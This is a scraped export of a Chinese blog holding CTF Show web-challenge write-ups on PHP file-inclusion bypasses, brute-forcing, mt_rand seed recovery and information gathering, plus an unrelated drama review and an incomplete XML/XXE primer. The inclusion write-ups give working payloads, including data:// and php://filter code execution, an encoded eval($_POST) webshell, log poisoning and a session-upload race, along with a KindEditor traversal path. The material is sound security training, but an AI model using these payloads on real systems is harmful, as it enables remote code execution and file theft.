?&gt;#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt; 1.2 Web 79 — 过滤 php — data:// base64 绕过12345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4= 1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）123456789&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 抓包可知：nginx 服务器 123#包含日志文件?file=/var/log/nginx/access.log写入php代码 1.4 Web 81 — 过滤 php、data、: — 日志文件包含（同时写上代码）12345678910&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1#同上，日志包含 1.5 Web 82-86 — 过滤 php、data、: 、. — SESSION 文件包含1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 任意上传一个文件 利用 session.upload_progress 进行文件包含利用https://www.cnblogs.com/NPFS/p/13795170.html https://www.freebuf.com/news/202819.html 目的：利用 session.upload_progress 将木马写入 session 文件，然后包含 session 文件 创建 session 文件（无 session_start() ） 选项 session.auto_start=On ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 关闭 。 选项 session.use_strict_mode=0 ，默认值是0即未启动时，用户可以自定义 session。 方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 /tmp/sess_flag 。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name 一起组成，最终写入 sess_文件 li里。 linux 下，session文件一般的默认存储位置是 /tmp 或 /var/lib/php/session 避免 session.upload_progress.cleanup=on 的干扰 该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。 方法：条件竞争 1.6 Web 87 — 过滤 php、data、: 、. — 死亡绕过1if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content); &#125;else&#123; highlight_file(__FILE__);&#125; 1# post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== 是 &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php 1# php://filter/write=convert.base64-decode/resource=1.php# 进行 url双编码# get?file更改 content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt; 访问得到 1.7 Web 88 — 过滤 + = — 拼凑 php 语句1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 注意不能出现= 和 +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h# PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h 解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a 1.8 Web 117 — convert.iconv.* + 死亡绕过1&lt;?php highlight_file(__FILE__);error_reporting(0);function filter($x)&#123; if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); 1# 过滤掉了我们常使用的过滤器，我们可以使用别的 例如：convert.iconv.* 它的编码解码与函数 iconv() 一致 https://blog.csdn.net/qq_44657899/article/details/109319686 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;); # ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# postab=system(&#x27;cat flag.php&#x27;); 1.9 Web 116 —misc+lfi 将视频 在 Kali 下进行 binwalk 1binwalk -e 1.pngbinbalk -D=png 1.mp4 # 获取图片 然后直接 ?file=php://filter/resource=flag.php 即可 ，但需要查看源码，页面上查看不了，我们可以抓包查看 二、总结文件包含 include() 函数 读文件 1?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?php system(&#x27;ls&#x27;); 写文件 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# 过滤 php data : Web 80-81# 日志包含?file=/var/log/nginx/access.log # 发送包时写入 代码# 过滤 . Web 82-86# SESSION 包含 条件竞争&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;死亡绕过 Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# 过滤 + = 限制 base64 Web 88# 拼凑 php 语句?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab 参考 https://blog.csdn.net/weixin_45882317/article/details/114576726","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-爆破","slug":"CTF-Show-爆破","date":"2021-10-01T11:10:35.000Z","updated":"2021-10-01T11:12:34.652Z","comments":true,"path":"2021/10/01/CTF-Show-爆破/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/","excerpt":"CTF show 爆破篇。","text":"CTF show 爆破篇。 一、CTF show — 爆破1.1 Web 21 — Burp 爆破 — base64-encode1爆破什么的，都是基操 抓包查看：输入的账号密码都被base64加密了，并且中间还有一个 : 分割 Burp 抓包，下载题目给的字典，进行爆破：手动更改 admin: base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，去掉勾选 URL编码，开始攻击。 1.2 Web 22 — 子域名爆破 — subDomainBrute 工具1域名也可以爆破的，试试爆破这个ctf.show的子域名 subDomainBrute 工具子域名爆破 访问 http://flag.ctfer.com/index.php 1.3 Web 23 — 根据代码要求写脚本1还爆破？这么多代码，告辞！ 1234567891011121314&lt;?php error_reporting(0); include(&#x27;flag.php&#x27;); if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125; &#125;else&#123; highlight_file(__FILE__); &#125;?&gt; 分析： 12intval(mixed $var [, int $base = 10 ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值 脚本：如果是 二位数 1234567891011121314151617&lt;?php error_reporting(0); $a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;for($i=0;$i&lt;36;$i++)&#123; for($j=0;$j&lt;36;$j++)&#123; $token=$a[$i].$a[$j]; $token = md5($token); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $a[$i].$a[$j]; exit(0); &#125; &#125; &#125;&#125; ?&gt; # 得到 3j 脚本：如果是 三位数 12345678910111213141516171819&lt;?phperror_reporting(0);$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;print (strlen($string).&quot;\\n&quot;);for ($a = 0; $a &lt; 62; $a++) &#123; for ($b = 0; $b &lt; 62; $b++) &#123; for ($c = 0; $c &lt; 62; $c++) &#123; $flag = $string[$a] . $string[$b] . $string[$c]; $token = md5($flag); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag . &quot;\\n&quot;; &#125; &#125; &#125; &#125;&#125;# 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE 1.4 Web 24 — php 伪随机数 — mt_srand()1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125;?&gt; 测试： 1&lt;?phpmt_srand(372619038);echo(mt_rand());?&gt;# 得到 1155388967 伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。 1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用https://www.cnblogs.com/zaqzzz/p/9997855.html 知道种子，可以确定你输出伪随机数的序列 知道随机数序列，倒过来也可以确定你的种子，如何确定？ 工具 php_mt_seed 1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 分析： 1hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5($flag), 0,8))); #确定 种子$rand = intval($r)-intval(mt_rand()); #得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析** 那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控 通过生成的随机数进行逆推可以得到种子，工具 php_mt_seed 还要注意的是： 1得到 $flag 的条件：1. !$rand 即 $rand 不存在2. $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改 如何确保 $rand 不存在 ？ 测试 当我们设置了种子之后 mt_srand ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 ?r=522258682 ，那最终就可以得到 $rand = 0 那现在我们就得要计算 (mt_rand()+mt_rand()) 了 要计算生成的随机数之和，首先得先确定种子才行啊 使用工具 php_mt_seed 1git clone https://github.com/otukijoe/php_mt_seed.git 1maketime ./php_mt_seed 1446899118 通过抓包可以知道 该 php 版本是 PHP/7.3.11 计算 token 值： 1&lt;?phphighlight_file(__FILE__);mt_srand(1048340704);echo mt_rand().&quot;\\n&quot;;echo mt_rand()+mt_rand().&quot;\\n&quot;;//1446899118 219330488?&gt; 抓包改值 1.6 Web 26 1 查看源码 1.7 Web 27 — 身份证爆破 我们需要爆破出 学生的出生日期 Burp 上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上 那么我们就从 1980 年开始设置 date 字典 然后成功查询，得到 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码 1621022199002015237 02015237 最后成功登录即可 1.8 Web 28 Url 当中的 /0/1/ 尝试爆破，即可得到","categories":[{"name":"CTF-Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"恶之花有感","slug":"恶之花有感","date":"2021-10-01T10:17:46.000Z","updated":"2021-10-01T11:44:54.831Z","comments":true,"path":"2021/10/01/恶之花有感/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/","excerpt":"","text":"如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。耳朵听到的，电视新闻上看到的，一定是真正的吗？谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。他们，有了，宝宝。他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。他不懂爱是什么，可他却早已深深地爱着她。她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。 即使不愿成为太阳，却依然绚烂夺目。","categories":[{"name":"影视有感","slug":"影视有感","permalink":"https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF Show---信息搜集","slug":"CTF-Show-信息搜集","date":"2021-10-01T09:20:33.000Z","updated":"2021-10-01T11:09:42.204Z","comments":true,"path":"2021/10/01/CTF-Show-信息搜集/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"CTF Show 中 web入门，信息搜集篇。","text":"CTF Show 中 web入门，信息搜集篇。 一、CTF Show — 信息搜集1.1 Web1 — 查看源代码直接查看源代码 1.2 Web 2 — 查看源代码1js前台拦截 === 无效操作 查看源代码的几种方式 右键查看源代码 F12 打开开发者工具 Ctrl + U 查看源代码 Burp 抓包查看 1.3 Web 3 — 抓包1没思路的时候抓个包看看，可能会有意外收获 抓包 尝试 1.4 Web 4 — robots.txt 泄露1总有人把后台地址写入robots，帮黑阔大佬们引路。 1.5 Web 5 — phps 文件1phps源码泄露有时候能帮上忙 phps文件 ​ 就是php的 源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。 ​ 它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。 1.6 Web 6 — www.zip 泄露1解压源码到当前目录，测试正常，收工 1.7 Web 7 — 版本控制 .git1版本控制很重要，但不要部署到生产环境更重要。 1.8 Web 8 — 版本控制 .svn1版本控制很重要，但不要部署到生产环境更重要。 1.9 Web 9 — vim 临时文件缓存1发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 Vim 缓存 ​ 临时文件 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动 删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可 以通过缓存文件恢复原始文件内容 ​ 以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp 第二次意外退出后，文件名为 .index.php.swo 第三次产生的缓存文件则为 .index.php.swn 1.10 Web 10 — cookie 泄露1cookie 只是一块饼干，不能存放任何隐私数据 1.11 Web 11 — 域名解析查询1域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息 查看域名解析 nslookup 1nslookup -qt=txt ctfshow.com 1#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type: A --&gt;地址记录 AAAA --&gt;地址记录 AFSDB Andrew --&gt;文件系统数据库服务器记录 ATMA --&gt;ATM地址记录 CNAME --&gt;别名记录 HINHO --&gt;硬件配置记录，包括CPU、操作系统信息 ISDN --&gt;域名对应的ISDN号码 MB --&gt;存放指定邮箱的服务器 MG --&gt;邮件组记录 MINFO --&gt;邮件组和邮箱的信息记录 MR --&gt;改名的邮箱记录 MX --&gt;邮件服务器记录 NS --&gt; 名字服务器记录 PTR --&gt;反向记录 RP --&gt;负责人记录 RT --&gt;路由穿透记录 SRV --&gt;TCP服务器信息记录 TXT --&gt;域名对应的文本信息 X25 --&gt;域名对应的X.25地址记录 在线历史解析记录查询 阿里云 DNS 检测 https://zijian.aliyun.com/ 1.12 Web 12 — 网站公开信息1有时候网站上的公开信息，就是管理员常用密码 1.13 Web 13 — 网站技术文档1技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码 1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）11. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录 KindEditor 3.5.5 遍历目录漏洞 http://www.nxadmin.com/web/96.html 1#payload/url/editor/php/file_manager_json.php?path=/ #可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/ 1/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/ 1/url/nothinghere/fl000g.txt 拓展：编辑器漏洞 1.15 Web 15 — 前端邮箱信息泄露1公开的信息比如邮箱，可能造成信息泄露，产生严重后果 前端页面当中找到邮箱信息 忘记密码 密保答案 西安 成功重置密码 成功登录 拿到 flag 1.16 Web 16 — 探针信息1对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 PHP 探针 ​ php探针 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。 常用4款PHP探针 应该是雅黑探针，访问 /tz.php 查找 ctfshow 即可 1.17 Web 17 — 绕过 CDN 查 IP1透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; 全球 ping 可知：无 CDN 查 www.ctfshow.com 的 IP，即为 ctfer.com的真实IP 1.18 Web 18 — 前端 js 泄露1不要着急，休息，休息一会儿，玩101分给你flag 查看源码，发现 Flappy_js.j unicode 解码 访问 110.php 1.19 Web 19 — 前端密钥泄露1密钥什么的，就不要放在前端了 查看源码得到 会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子 1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露1mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 1.21 Web 382 —首先查看源代码 可以一一进行尝试，最后发现 http://url/alsckdfy/ 竟然是网站的后台登录页面 爆破 弱密码 sql 万能密码 成功登录之后即可获得 flag 二、做题总结 第一步：查看 源代码 右键查看源代码 F12 打开开发者工具 Ctrl + U 查看源代码 Burp 抓包查看 抓包 可能发现一些有用信息 robots.txt phps 源代码泄露 下载源码文件、网站备份文件 版本控制不要部署到生产环境中 .git .svn Vim 缓存 .文件名.php.swp .文件名.php.swo .文件名.php.swn cookie 的重要性 域名、子域名 信息搜集 nslookup 在线网站 Banner 等公开信息 管理员密码 QQ QQ邮箱等 第三方软件查个人信息 技术文档 对应编辑器漏洞 探针 前端源码 密钥泄露 db.mdb","categories":[{"name":"CTF-Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"信息搜集","slug":"信息搜集","permalink":"https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"}],"author":"xizhi-future"},{"title":"XML与XXE","slug":"XML与XXE","date":"2021-10-01T09:16:32.000Z","updated":"2021-10-01T09:21:35.693Z","comments":true,"path":"2021/10/01/XML与XXE/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/","excerpt":"一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。","text":"一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。 特征，与 HTML 的区别： XML 被设计用来 被设计用来结构化、存储以及传输信息，焦点是数据的内容。 HTML 被设计用来 显示数据，焦点是数据的外观。 HTML 旨在 显示信息，而 XML 旨在 传输信息 XML 的设计宗旨是传输数据，而不是显示数据 XML 被设计为具有 自我描述性 XML 标签没有被预定义。您需要自行定义标签（即允许创作者定义自己的标签和自己的文档结构） HTML 文档只能使用在 HTML 标准中定义过的标签（如 &lt;p&gt;、&lt;h1&gt; 等等） XML标签必须闭合，允许 &lt;外观 /&gt;,不允许 &lt;外观&gt;，只可是 &lt;外观&gt;&lt;/外观&gt; HTML可不闭合 ，可 &lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt; XML标签的 结构和样式分离 HTML标签的 结构和样式结合在一起 &lt;h1&gt;标签 是W3C的推荐标准 注：本来发明XML是为了替换掉HTML标签的，最后由于各种原因，未能成功替换掉，于是解决办法是发明了一个新的 XHTML，该语言内部的技术使用的是XML的，而标签都是HTML的 作用： 当作小型的数据库使用 msg聊天工作通过xml文件在本地保留聊天记录 许多软件的 配置文件 都是通过xmk来保存的 许多媒体工资通过xml文件保留用户之前看到的媒体信息 在网站当中当作 “接口” 服务 XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 例子： 123456789101112131415#XML文档&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; 充分体现了 具有自我描述性，但是这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。 1.2 用途 XML 把数据从 HTML 分离，是独立于软件和硬件的信息传输工具 简化数据共享 简化数据传输 简化平台变更，其实也是简化数据的传输与共享 1.3 规则12345671.XML文档必须有一个（唯一） 根元素 ，该元素是其他元素的 父元素2.XML每个元素都必须有开始和结束标签，即成对出现3.XML标签对大小写敏感，开始与闭合标签大小写类型需要一致4.XML元素需要正确嵌套，即不可交叉嵌套 #&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; 错误5.XML属性 必须有 值，且必须加引号6.特殊字符需要 实体引用7.注释：&lt;!-- --&gt; 12345标签的组成部分：1.字母，数字，下划线2.不能以 数字和标点符号 开始3.不能包含 空格4.最好避免使用 - , . , : 等 实体引用 &amp;lt; &lt; &amp;gt; &gt; &amp;amp; &amp; &amp;apos; ‘ &amp;quot; “ 其实在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。 1.4 PCDATA被解析的字符，文本 不能含有 特殊字符 1.5 CDATA不会被解析的字符，文本 当需要显示的特殊符号偏多，但又不想使用实体的引用时，可使用 CDATA，它指的是不应该由 XML解释器进行解析的文本数据。 123#使用&lt;![CDATA[文本数据]]&gt;#例子：&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt; 1.6 XML 属性 